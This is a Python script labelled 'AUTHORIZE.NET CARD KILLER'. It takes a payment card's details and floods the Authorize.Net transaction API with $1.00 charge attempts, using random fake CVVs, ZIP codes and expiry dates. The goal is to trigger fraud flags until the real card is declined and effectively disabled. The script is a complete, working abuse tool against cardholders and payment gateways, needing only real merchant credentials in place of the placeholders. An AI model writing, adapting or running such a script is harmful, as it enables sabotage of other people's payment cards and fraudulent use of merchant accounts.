import requests
import random
import time
import threading
from xml.etree import ElementTree as ET

# ====== USER INPUT ======
print("="*50)
print("💳 AUTHORIZE.NET CARD KILLER (LIVE API FLOW)")
print("="*50)

card_number = input("Enter Card Number: ")
exp_month   = input("Enter Expiry Month (MM): ")
exp_year    = input("Enter Expiry Year (YY): ")
cvv_real    = input("Enter CVV: ")
zip_real    = input("Enter ZIP Code: ")

# ====== AUTH.NET CREDENTIALS ======
api_login_id = "YOUR_API_LOGIN_ID"
transaction_key = "YOUR_TRANSACTION_KEY"

loading = True
start_time = time.time()

# ====== LOADING BAR ======
def animate_loading():
    bar = ["[🟦     ]", "[🟦🟦    ]", "[🟦🟦🟦   ]", "[🟦🟦🟦🟦  ]", "[🟦🟦🟦🟦🟦 ]", "[🟦🟦🟦🟦🟦🟦]"]
    while loading:
        for stage in bar:
            print(f"\rProcessing {stage}", end="", flush=True)
            time.sleep(0.3)

# ====== CHARGE FUNCTION ======
def send_authnet_request(cvv, zip_code, month, year):
    exp_date = f"{month}/{year}"

    payload = f"""<?xml version="1.0" encoding="utf-8"?>
    <createTransactionRequest xmlns="AnetApi/xml/v1/schema/AnetApiSchema.xsd">
      <merchantAuthentication>
        <name>{api_login_id}</name>
        <transactionKey>{transaction_key}</transactionKey>
      </merchantAuthentication>
      <transactionRequest>
        <transactionType>authCaptureTransaction</transactionType>
        <amount>1.00</amount>
        <payment>
          <creditCard>
            <cardNumber>{card_number}</cardNumber>
            <expirationDate>{exp_date}</expirationDate>
            <cardCode>{cvv}</cardCode>
          </creditCard>
        </payment>
        <billTo>
          <zip>{zip_code}</zip>
        </billTo>
      </transactionRequest>
    </createTransactionRequest>
    """

    headers = {
        "Content-Type": "application/xml"
    }

    try:
        response = requests.post(
            url="https://apitest.authorize.net/xml/v1/request.api",
            data=payload,
            headers=headers,
            timeout=10
        )

        xml_response = ET.fromstring(response.content)
        status = xml_response.find(".//messages/resultCode").text
        response_text = xml_response.find(".//directResponse").text if xml_response.find(".//directResponse") is not None else ""

        if status == "Ok" and ",1," in response_text:
            return "approved"
        elif status == "Ok" and ",2," in response_text:
            return "declined"
        else:
            return "error"

    except Exception as e:
        return "timeout"

# ====== MAIN KILLER LOGIC ======
def kill_card():
    global loading
    attempt = 0
    killed = False

    while not killed:
        for _ in range(4):  # Auth.net usually flags after 3-4 bad tries
            fake_cvv = str(random.randint(100, 999))
            fake_zip = str(random.randint(10000, 99999))
            fake_month = str(random.randint(1, 12)).zfill(2)
            fake_year = str(random.randint(25, 30))

            attempt += 1
            result = send_authnet_request(fake_cvv, fake_zip, fake_month, fake_year)
            print(f"\n[Attempt {attempt}] Fake charge: {result}")

        result = send_authnet_request(cvv_real, zip_real, exp_month, exp_year)

        if result == "declined":
            killed = True
        else:
            print("\n[✓] Card still alive... Retrying!\n")

    loading = False
    duration = round(time.time() - start_time, 2)
    print(f"\n💀 CARD SUCCESSFULLY KILLED! [Time: {duration}s]")

# ====== RUNNING THREADS ======
t1 = threading.Thread(target=animate_loading)
t2 = threading.Thread(target=kill_card)

t1.start()
t2.start()
t2.join()
